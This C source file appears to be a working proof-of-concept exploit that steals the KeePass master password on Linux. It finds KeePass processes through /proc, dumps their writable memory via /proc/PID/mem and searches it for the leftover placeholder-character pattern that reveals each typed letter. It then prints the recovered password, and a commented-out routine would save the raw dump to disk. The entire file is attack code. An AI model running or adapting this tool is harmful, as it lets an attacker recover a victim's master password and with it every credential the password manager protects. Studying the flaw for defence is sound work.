#include <dirent.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <ctype.h>

#define ERROR(msg) do { \
    perror(msg); \
    return(1); \
} while (0)

int write_mem_dump_to_file(const char *filename, const unsigned char *mem_dump, size_t mem_dump_size);
int dump_mem(pid_t pid, unsigned char **mem_dump, size_t *mem_dump_size);
void parse_and_print_pwd(unsigned char* mem_dump, size_t mem_dump_size);
int find_pids_by_name(const char *name, pid_t **pids);

const char *proc_name = "KeePass";

int main(int argc, char *argv[]) {
    pid_t *pids = NULL;

    int num_procs = find_pids_by_name(proc_name, &pids);
    if (num_procs <= 0)
        ERROR("error finding keepass");

    printf("[+] found at least one keepass instance, pid %d\n", pids[0]);
    
    for (int i = 0; i < num_procs; i++) {
        unsigned char *mem_dump = NULL;
        size_t mem_dump_size = 0;
        
        if (dump_mem(pids[i], &mem_dump, &mem_dump_size) < 0) {
            free(pids);
            ERROR("error dumping mem dump");
        }

        printf("[+] mem dump successful\n");

        // printf("%d\n", mem_dump_size);

        // if (write_mem_dump_to_file("keepass_dump.dmp", mem_dump, mem_dump_size) < 0) {
        //    free(pids);
        //    ERROR("error writing to file");
        // };

        parse_and_print_pwd(mem_dump, mem_dump_size);
        free(mem_dump);
    }
    free(pids);
    return 0;
}

void parse_and_print_pwd(unsigned char* mem_dump, size_t mem_dump_size) {
    int current_str_len = 0;
    char debug_str[512] = "";
    
    for (int j = 0; j < mem_dump_size - 1; j++) {
        if (mem_dump[j] == 0xcf && mem_dump[j + 1] == 0x25) {
            int cf25_count = 0;
            
            for (int k = 0; k < current_str_len; k++) {
                if (mem_dump[j + 2 + k * 2] == 0xcf 
                    && mem_dump[j + 2 + k * 2 + 1] == 0x25) {
                    cf25_count++;
                } else {
                    break;
                }
            }

            if (cf25_count == current_str_len) {
                char letter[3] = "";
                letter[0] = mem_dump[j + current_str_len * 2 + 2];
                letter[1] = '\0';
                if (isprint(letter[0]) && mem_dump[j + current_str_len * 2 + 4] == 0) {
                    strcat(debug_str, letter);
                    current_str_len++;
                }
            }
        }
    }
    printf("[+] manages to extract (first typed letter is missing): \n%s\n", debug_str);
}

int find_pids_by_name(const char *name, pid_t **pids) {
    DIR *dir;
    struct dirent *entry;
    int num_procs = 0;

    if (!(dir = opendir("/proc")))
        ERROR("error opening /proc");
    while ((entry = readdir(dir))) {
        if (entry->d_type == DT_DIR) {
            int pid = atoi(entry->d_name);
            if (pid) {
                char cmdline_path[64];
                snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);

                FILE *cmdline_file = fopen(cmdline_path, "r");
                if (cmdline_file) {
                    // cmdline files in /proc starting with "mono" have a null byte after it, like so:
                    // "mono\0", so we take it into account.
                    char cmdline[256];
                    size_t cmdline_len = fread(cmdline, 1, sizeof(cmdline) - 1, cmdline_file);
                    cmdline[cmdline_len] = '\0';
                    fclose(cmdline_file);

                    for (size_t i = 0; i < cmdline_len; i++) {
                        if (cmdline[i] == '\0') {
                            cmdline[i] = ' ';
                        }
                    }

                    if (strstr(cmdline, name)) {
                        num_procs++;
                        *pids = realloc(*pids, sizeof(pid_t) * num_procs);
                        (*pids)[num_procs - 1] = pid;
                    }
                }
            }
        }
    }

    closedir(dir);
    return num_procs;
}

int dump_mem(pid_t pid, unsigned char **mem_dump, size_t *mem_dump_size) {
    char maps_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

    FILE *maps_file = fopen(maps_path, "r");
    if (!maps_file) {
        return -1;
    }

    *mem_dump = NULL;
    *mem_dump_size = 0;

    char line[256];
    while (fgets(line, sizeof(line), maps_file)) {
        uintptr_t start, end;
        char perms[5];
        char file_path[256] = "";
        sscanf(line, "%lx-%lx %s %*s %*s %*s %255s", &start, &end, perms, file_path);

        // Ignore all memmaps assigned to libraries and take only `rw` permissions
        if (perms[0] == 'r' && perms[1] == 'w' && strlen(file_path) == 0) {
            char mem_path[64];
            snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
            int mem_fd = open(mem_path, O_RDONLY);
            if (mem_fd < 0) {
                fclose(maps_file);
                return -1;
            }

            size_t length = end - start;
            unsigned char *buffer = malloc(length);

            if (pread(mem_fd, buffer, length, start) != -1) {
                *mem_dump_size += length;
                *mem_dump = realloc(*mem_dump, *mem_dump_size);
                memcpy(*mem_dump + (*mem_dump_size - length), buffer, length);
            }

            free(buffer);
            close(mem_fd);
        }
    }

    fclose(maps_file);
    return 0;
}

int write_mem_dump_to_file(const char *filename, const unsigned char *mem_dump, size_t mem_dump_size) {
    FILE *file = fopen(filename, "wb");
    if (!file) {
        ERROR("failed to create the dump file");
        return -1;
    }

    size_t written = fwrite(mem_dump, 1, mem_dump_size, file);
    fclose(file);

    return (written == mem_dump_size) ? 0 : -1;
}
